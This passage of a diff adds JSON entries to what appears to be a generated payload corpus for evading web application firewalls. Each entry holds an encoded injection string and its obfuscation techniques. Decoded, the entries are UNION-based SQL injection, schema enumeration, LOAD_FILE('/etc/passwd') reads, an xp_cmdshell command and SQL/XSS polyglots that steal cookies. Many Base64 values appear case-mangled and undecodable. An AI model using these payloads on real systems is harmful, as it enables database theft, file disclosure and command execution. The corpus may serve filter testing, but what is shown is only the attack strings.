+        "comment_swap",
+        "encoding::DeflateEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1636
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtDsJ",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1639
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C3b23",
+      "techniques": [
+        "comment_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1642
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MqLvTkLpTgLtRuXfQ1qJtLvMtC0tCs0",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1645
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3109554E494f4E0953454c454354094E554c4C2d2D092d",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1648
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MqPvTkLpTgPtRuXfQ1qKtLvMtC0tCi0",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1651
+    },
+    {
+      "confidence": 0.9,
+      "payload": "310A554e494F4e0A53454c4543540A4e554C4c2D2d0A2d",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1654
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsSoK1vOsU9oKyGrU0vMrUnUkYgRtLvMtC0tKyGrLq",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1657
+    },
+    {
+      "confidence": 0.9,
+      "payload": "312B282b554E494f4E2b282B53454c4543542B282b4E554c4C2d2D2b282B2d",
+      "techniques": [
+        "whitespace_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1660
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBbTeWgU0vMrUnUiE5vTeWtLsAt",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1663
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E20414c4C2053454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1666
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBeSvNuSu5DvCbTrUxFq1QgTlVmTc0TiC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1669
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2044495354494e43542053454C454354204e554C4c2D2d202D",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1672
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiUwQvNfTeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1675
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E25304153454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1678
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiUwOvNfTeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1681
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E25303953454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1684
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiUwRcUwQvNfTeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1687
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E25304425304153454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1690
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiUwQlNfTeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1693
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E25304253454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1696
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiUwQ1nFtEvDvCbOvUxMlS0gLq",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1699
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E25304353454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1702
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiVbMfNfTeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1705
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E25413053454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1708
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTi8QkI9tRuXfQ1qGtLvMtC0tIc0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1711
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2f2A2a2F53454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1714
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTi8QzM9vKi9TrUxFq1QgTlVmTc0TiC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1717
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2f2A666f6F2a2F53454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1720
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTi8QjTaWkI9tRuXfQ1qGtLvMtC0tIc0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1723
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2f2A2530302a2F53454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1726
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsAvKiFvTkLpTiOvIfNfTeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1729
+    },
+    {
+      "confidence": 0.9,
+      "payload": "31202F2a21554E494f4E2a2F2053454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1732
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsAvKiFvTkLpTiOvLyOhU0vMrUnUkI8gTlVmTc0TiC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1735
+    },
+    {
+      "confidence": 0.9,
+      "payload": "31202F2a21554E494f4E2a2F2f2A2153454c4543542A2f204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1738
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTi8QiSbTrUxFq1QqLyBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1741
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2f2A212053454c4543542A2f204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1744
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsAvKiE1mDaWmFvOsU9oKi8VkIe1MdAwMfNfTeVdVcOvIe5VtEwTlSaT",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1747
+    },
+    {
+      "confidence": 0.9,
+      "payload": "31202F2a213530303030554E494f4E2a2F2f2A21353030303053454c4543542A2f204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1750
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsAvKiE0mDaWmFvOsU9oKi8VkIe0MdAwMeFmTcOvLyOhNdAwMdBtRuXfQ1qQlYbOvUxMlS0gLq",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1753
+    },
+    {
+      "confidence": 0.9,
+      "payload": "31202F2a213430303030554E494f4E2a2F2f2A213430303030414c4C2a2F2f2A21343030303053454c4543542A2f204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1756
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsAvKiE5oTk5OvVoSu9OkI9tRuXfQ1qGtLvMtC0tIc0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1759
+    },
+    {
+      "confidence": 0.9,
+      "payload": "31202F2a213939393939554E494f4E2a2F53454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1762
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvBkLvTi8QkI9tZuXlQ3qGtLvMtC0tIc0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1765
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120556E496f4E2f2A2a2F53654c654374204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1768
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsB1tMlPbI8qKi9ZrWxFy1QgTlVmTc0TiC0",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1771
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120754E694f6E2f2A2a2F73456c456354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1774
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvBkLvTiUwQxNfBeVjVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1777
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120556E496f4E25304173456c456354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1780
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTlVoSu9OsU9oIfNfU0vMrUnUtEvDvCbOvUxMlS0gLq",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1783
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E554e494F4e494F4e20534553454C4543544c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1786
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkL1bMlVbK9oIfNfThNlBgVjDeVdVcBoVuXmLs0GlQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1789
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E49756e696F6e4F4e2053454C73656c656374454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1792
+    },
+    {
+      "confidence": 0.9,
+      "payload": "AsIa3F8xIfVoSxVuAw9Ut04Gu0VmC2vSzWn0RuNuIe5VtEwTlSaT",
+      "techniques": [
+        "union_swap",
+        "encoding::DeflateEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1795
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTlWkU0vMrUnUiE5vTeWtLsAt",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1798
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E5c0A53454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1801
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiAvKiE1mDaWmCbTrUxFq1QgTlVmTc0TiC0qLw",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1804
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E202f2A2135303030302053454c454354204E554c4C2d2D202d2A2f",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1807
+    },
+    {
+      "confidence": 0.9,
+      "payload": "AsIa3F8xIfVoSu9OiC8qItUwMdAwIfNfTeVdVcBoVuXmLs0GlSoV",
+      "techniques": [
+        "mysql",
+        "encoding::DeflateEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1810
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtC0tIc0",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1813
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C2d2D202d",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1816
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiAvKiEwMdAwMcBtRuXfQ1qGtLvMtC0tIc0QlW",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1819
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E202f2A2130303030302053454c454354204E554c4C2d2D202d2A2f",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1822
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiAvKiFtRuXfQ1qGtLvMtC0tIc0QlW",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1825
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E202f2A2153454c454354204E554c4C2d2D202d2A2f",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1828
+    },
+    {
+      "confidence": 0.9,
+      "payload": "M1qI9fP091pQ11iMdVvXdQ5r8Av18DhVvDdV0gCa",
+      "techniques": [
+        "mysql",
+        "encoding::DeflateEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1831
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsBvTkLpTiBtRuXfQ1qGtLvMtC0tIc0GvU5jT04gU0vMrUnUiHrHyMxLx25HbWuStLvMtCbGuK9nIgLuZm9YbWf0Aw9Ux3NjAgVtYs50YwJsZxMtLq",
+      "techniques": [
+        "mysql",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1834
+    },
+    {
+      "confidence": 0.9,
+      "payload": "3120554E494f4E2053454c454354204E554c4C2d2D202d20554E494f4E2053454c454354207461626C655f6E616d652C4e554C4c2046524F4d20696E666f726D6174696f6E5f736368656D612e7461626C65732d2D",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1837
+    },
+    {
+      "confidence": 0.9,
+      "payload": "JyBpUiAnMsC9jZeNiC0tIdXzY3jPcHq-YwXlCnQoMsK8l3NjCmLwDd4",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1840
+    },
+    {
+      "confidence": 0.9,
+      "payload": "27204F52202731273d273127202D2d203C7363726970743e616C6572742831293c2F7363726970743e",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1843
+    },
+    {
+      "confidence": 0.9,
+      "payload": "JyBvTkLpTiBtRuXfQ1qGjZxPbWcGc3JjPxGgB25lCnJvCj1HbGvYdCgXkT4nLs0G",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64Encode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1846
+    },
+    {
+      "confidence": 0.9,
+      "payload": "2720554E494f4E2053454c45435420273C696d67207372633D78206f6E6572726f723D616c6572742831293E272d2D20",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1849
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MsCgQu5EiDe9MsBbTkQgJzXzDmCgB25sB2fKpWfSzXj0KdEpPiC9jW",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1852
+    },
+    {
+      "confidence": 0.9,
+      "payload": "312720414E4420313d3120414E4420273c737667206F6e6C6f61643D616c6572742831293E273d27",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1855
+    },
+    {
+      "confidence": 0.9,
+      "payload": "Jy1Jb25MaXjTkDePlSc",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1858
+    },
+    {
+      "confidence": 0.9,
+      "payload": "272D636f6E6669726d2831292D27",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1861
+    },
+    {
+      "confidence": 0.9,
+      "payload": "JyItLt5DxT4qLzWvC2nYaXb0PjXzDmCgB25sB2fKpWfSzXj0KdEpPg",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1864
+    },
+    {
+      "confidence": 0.9,
+      "payload": "27222D2d3E5d5D3e2A2f3C2f7363726970743E3c737667206F6e6C6f61643D616c6572742831293E",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1867
+    },
+    {
+      "confidence": 0.9,
+      "payload": "JyBvTkLpTiBtRuXfQ1qGbNvSbCxJb25JyXqOjZxZdMcVb25Sb2FkPwFsZxJ0kDePpIcPlS0",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1870
+    },
+    {
+      "confidence": 0.9,
+      "payload": "2720554E494f4E2053454c454354206E756c6C2c636F6e63617428273C7376672f6F6e6C6f61643D616c6572742831293E27292d2D",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1873
+    },
+    {
+      "confidence": 0.9,
+      "payload": "MtTtRuXfQ1qGjZxPbWcGc3JjPxGgB25lCnJvCj1HbGvYdChKb2N1bWvUdC5jB29rAwUpPiCtLq",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1876
+    },
+    {
+      "confidence": 0.9,
+      "payload": "313B53454c45435420273C696d67207372633D78206f6E6572726f723D616c65727428646F63756d656E742e636F6f6B6965293e272D2d",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1879
+    },
+    {
+      "confidence": 0.9,
+      "payload": "JzSgRvHfQyB4cF9jBwRzAgVsBcGnD2hVyW1pJyKtLq",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1882
+    },
+    {
+      "confidence": 0.9,
+      "payload": "273B20455845432078705f636D647368656c6C282777686f616D6927292d2D",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1885
+    },
+    {
+      "confidence": 0.9,
+      "payload": "JyBvTkLpTiBtRuXfQ1qGtE9bRf9GsUxFkCcVzXrJl3BhC3n3ZcCpLs0",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::Base64UrlEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1888
+    },
+    {
+      "confidence": 0.9,
+      "payload": "2720554E494f4E2053454c454354204C4f41445F46494c4528272F6574632f70617373776427292D2d",
+      "techniques": [
+        "polyglot_sql_xss",
+        "encoding::HexEncode",
+        "chain::CaseAlternation"
+      ],
+      "variant": 1891
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAoU0VMRUNUIE5VTEwtLSAt",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1892
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202853454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1893
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBBTEwgKFNFTEVDVCBOVUxMLS0gLQ",
+      "techniques": [
+        "union_swap",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1899
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e20414c4c202853454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "union_swap",
+        "encoding::HexEncode"
+      ],
+      "variant": 1900
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiFTRUxFQ1QqLyBOVUxMLS0gLQ",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1906
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a2153454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1907
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTLyoqL0UvKiovTC8qKi9FLyoqL0MvKiovVCBOVUxMLS0gLQ",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1913
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e20532f2a2a2f452f2a2a2f4c2f2a2a2f452f2a2a2f432f2a2a2f54204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1914
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTLyolMDAqL0UvKiUwMCovTC8qJTAwKi9FLyolMDAqL0MvKiUwMCovVCBOVUxMLS0gLQ",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::Base64UrlEncode"
+      ],
+      "variant": 1920
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e20532f2a2530302a2f452f2a2530302a2f4c2f2a2530302a2f452f2a2530302a2f432f2a2530302a2f54204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1921
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0tIC0gVU5JT04gU0VMRUNUIGNvbHVtbl9uYW1lLE5VTEwgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucy0t",
+      "techniques": [
+        "mysql",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1926
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e2053454c454354204e554c4c2d2d202d20554e494f4e2053454c45435420636f6c756d6e5f6e616d652c4e554c4c2046524f4d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e732d2d",
+      "techniques": [
+        "mysql",
+        "encoding::HexEncode"
+      ],
+      "variant": 1927
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVLyoqL04vKiovSS8qKi9PLyoqL04gU0VMRUNUIE5VTEwtLSAt",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1932
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120552f2a2a2f4e2f2a2a2f492f2a2a2f4f2f2a2a2f4e2053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1933
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVLyolMDAqL04vKiUwMCovSS8qJTAwKi9PLyolMDAqL04gU0VMRUNUIE5VTEwtLSAt",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1938
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120552f2a2530302a2f4e2f2a2530302a2f492f2a2530302a2f4f2f2a2530302a2f4e2053454c454354204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1939
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiE1MDAwMFNFTEVDVCovIE5VTEwtLSAt",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1944
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a21353030303053454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1945
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiE0MDAwMFNFTEVDVCovIE5VTEwtLSAt",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1950
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a21343030303053454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1951
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiE5OTk5OVNFTEVDVCovIE5VTEwtLSAt",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1956
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a21393939393953454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1957
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiAvKiE1MDAwMVNFTEVDVCovIE5VTEwtLSAt",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1962
+    },
+    {
+      "confidence": 0.91,
+      "payload": "3120554e494f4e202f2a21353030303153454c4543542a2f204e554c4c2d2d202d",
+      "techniques": [
+        "mysql_version_conditional",
+        "encoding::HexEncode"
+      ],
+      "variant": 1963
+    },
+    {
+      "confidence": 0.91,
+      "payload": "MSBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKE5VTEwtLSAt",
+      "techniques": [
+        "mysql",
+        "encoding::Base64Encode"
+      ],
+      "variant": 1968
+    },
+    {
+      "confidence": 0.91,
